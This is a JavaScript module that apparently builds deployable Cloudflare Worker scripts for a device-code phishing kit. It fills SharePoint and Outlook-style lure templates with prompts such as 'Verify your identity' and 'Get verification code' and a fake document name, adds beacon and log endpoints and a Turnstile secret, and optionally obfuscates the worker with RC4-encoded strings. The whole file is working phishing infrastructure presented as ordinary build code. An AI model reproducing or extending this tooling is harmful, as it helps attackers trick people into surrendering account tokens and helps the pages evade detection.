// Template Loader - Builds worker script with injected template HTML
// Used server-side during worker deployment
const fs = require('fs');
const path = require('path');
const { loadTemplateHTML, loadTemplateCSS, loadTemplateJS, loadVerificationDesignCSS } = require('../backend/services/templateloader');
const config = require('../backend/config/env');

function buildWorkerScript(link, user) {
  // SANITIZE: Only include safe fields, exclude ALL sensitive data (tokens, secrets, keys)
  const safeUser = {
    id: user?.id,
    subscription_status: user?.subscription_status,
    subscription_plan: user?.subscription_plan,
  };
  // NEVER embed: login_key, totp_secret, telegram_id, telegram_bot_token,
  // cf_api_token, cf_account_id, bunny_api_key, bunny_storage_zone
  // These must NEVER leave the backend. Worker should fetch from backend API at runtime.

  const templateType = link.template_type || 'sharepoint4';
  const designName = link.verification_design || 'outlook';
  let templateHTML = loadTemplateHTML(templateType);
  const templateCSS = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
  let templateJS = loadTemplateJS(templateType);

  // Replace template placeholders
  templateHTML = templateHTML
    .replace('{{CSS}}', templateCSS)
    .replace('{{TITLE}}', link.title_text || 'Verify your identity')
    .replace('{{MESSAGE}}', link.message_text || 'Please verify your identity to continue')
    .replace('{{BUTTON_TEXT}}', link.button_text || 'Get verification code')
    .replace('{{FILE_NAME}}', link.file_name || 'Document.pdf')
    .replace('{{PAGES}}', String(link.pages || 1));

  // Handle preload/no-preload
  try {
    const templateConfig = require(`../templates/${templateType}/config.json`);
    if (templateConfig.preload) {
      templateHTML = templateHTML.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
      templateHTML = templateHTML.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
    } else {
      templateHTML = templateHTML.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/NO_PRELOAD\}\}/g, '');
      templateHTML = templateHTML.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
    }
  } catch (e) {
    // Template config may not exist for some types - skip preload handling
  }

  // Load worker base
  let workerScript = fs.readFileSync(path.join(__dirname, 'devicecode-worker.js'), 'utf8');

  // Inject values - use CF_WORKERS_SUBDOMAIN when set, otherwise fall back to
  // configured APP_URL or a localhost development URL. Avoid producing "https://.workers.dev".
  let serverUrl = '';
  if (config.CF_WORKERS_SUBDOMAIN) {
    serverUrl = `https://${config.CF_WORKERS_SUBDOMAIN}.workers.dev`;
  } else if (config.APP_URL) {
    serverUrl = String(config.APP_URL).trim().replace(/\/$/, '');
  } else {
    serverUrl = `http://localhost:${config.PORT || 3000}`;
  }

  // Inject user data as a sanitized JSON string
  const safeUserJson = JSON.stringify(safeUser);

  workerScript = workerScript
    .replace("'{{VERIFY_ENDPOINT}}'", `'${serverUrl}'`)
    .replace("'{{BEACON_ENDPOINT}}'", `'${serverUrl}'`)
    .replace("'{{LOG_ENDPOINT}}'", `'${serverUrl}'`)
    .replace("'{{TURNSTILE_SECRET}}'", `'${config.CF_TURNSTILE_SECRET_KEY}'`)
    .replace("'{{TEMPLATE_HTML}}'", `\`${templateHTML}\``)
    .replace("'{{USER_DATA}}'", safeUserJson);

  // Obfuscate if enabled - SAFE obfuscation profile for Cloudflare Workers
  // Uses only worker-compatible settings that don't break execution
  if (config.ENABLE_OBFUSCATION || link.obfuscated) {
    try {
      const JavaScriptObfuscator = require('javascript-obfuscator');
      const result = JavaScriptObfuscator.obfuscate(workerScript, {
        compact: true,
        controlFlowFlattening: false,       // Disabled - can break worker timing
        controlFlowFlatteningThreshold: 0,
        deadCodeInjection: false,           // Disabled - adds bloat
        deadCodeInjectionThreshold: 0,
        debugProtection: false,             // DISABLED - freezes worker with setInterval
        debugProtectionInterval: 0,         // Disabled - breaks async operations
        disableConsoleOutput: true,
        identifierNamesGenerator: 'hexadecimal',
        renameGlobals: false,               // Disabled - keeps global scope intact for workers
        selfDefending: false,               // DISABLED - breaks when minified/obfuscated
        stringArray: true,
        stringArrayCallsTransform: true,
        stringArrayEncoding: ['rc4'],
        stringArrayIndexShift: true,
        stringArrayRotate: true,
        stringArrayShuffle: true,
        stringArrayWrappersCount: 1,        // Minimal wrappers
        stringArrayWrappersChainedCalls: false, // Disabled - prevents infinite loops
        stringArrayWrappersParametersMaxCount: 1,
        stringArrayWrappersType: 'variable',
        stringArrayWrappersCount: 1,
        transformObjectKeys: false,         // Disabled - breaks property access
        unicodeEscapeSequence: true,
        numbersToExpressions: false,        // Disabled - prevents syntax issues
        simplify: true,
        splitStrings: true,
        splitStringsChunkLength: 10,
      });
      workerScript = result.getObfuscatedCode();
      console.log(`[Obfuscation] Worker obfuscated successfully (${link.template_type || 'unknown'})`);
    } catch (e) {
      console.error('[Obfuscation] Worker obfuscation failed, using raw script:', e.message);
      // Fall through with unobfuscated script - don't break deployment
    }
  }

  return workerScript;
}

module.exports = { buildWorkerScript };
